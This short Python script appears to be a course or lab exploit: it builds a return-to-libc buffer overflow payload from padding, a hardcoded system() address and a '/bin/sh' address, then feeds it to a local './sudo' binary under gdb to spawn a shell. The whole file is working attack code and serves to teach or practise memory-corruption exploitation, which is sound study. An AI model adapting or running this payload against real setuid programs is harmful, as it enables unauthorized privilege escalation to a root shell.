import os, sys, struct


PATH_TO_SUDO = './sudo'


def get_arg():
	binsh_address = 0xb7d7d82b
	system_address = 0xb7c5cda0
	return 'a'*66 + struct.pack('<I',system_address) + 'a'*4 + struct.pack('<I',binsh_address)


def main(argv):
    #os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg());
    os.execl('/usr/bin/gdb', '/usr/bin/gdb', '-ex=r', '--args', './sudo', get_arg())


if __name__ == '__main__':
    main(sys.argv)
